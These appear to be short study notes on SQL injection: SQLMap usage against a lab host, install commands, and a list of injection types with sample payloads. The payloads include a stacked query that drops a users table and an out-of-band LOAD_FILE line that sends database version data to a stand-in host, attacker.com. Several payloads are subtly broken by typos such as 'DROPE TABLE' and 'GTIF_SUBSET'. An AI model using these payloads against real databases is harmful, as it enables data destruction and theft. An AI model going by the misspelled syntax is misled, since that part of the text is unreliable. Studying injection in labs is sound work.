
To use SQLMap we can use : `python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'`
To install SQLMap : 
``` shell
# For Linux
sudo apt install sqlmap

#For Windows
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```
## Types of SQLi
- **Boolean-based Blind SQL Injection** : `AND 1=1`
- **Error-based SQL Injection** : `AND GTIF_SUBSET(@@version,0)`
- **Union query based** : `UNION ALL SELECT 1,@@version,3`
- **Stacked Queries** : `; DROPE TABLE users`
- **Time-based Blind SQL Injection** : `AND 1=IF(2>1,SLEEP(5),0)`
- **Inline Queries** : `SELECT(SELECT @@version) from`
- **Out-of-band SQL Injection** : `LOAD_FILE(CONCAT('\\\',@@version,'.attacker.com\\README.txxt'))`
- 
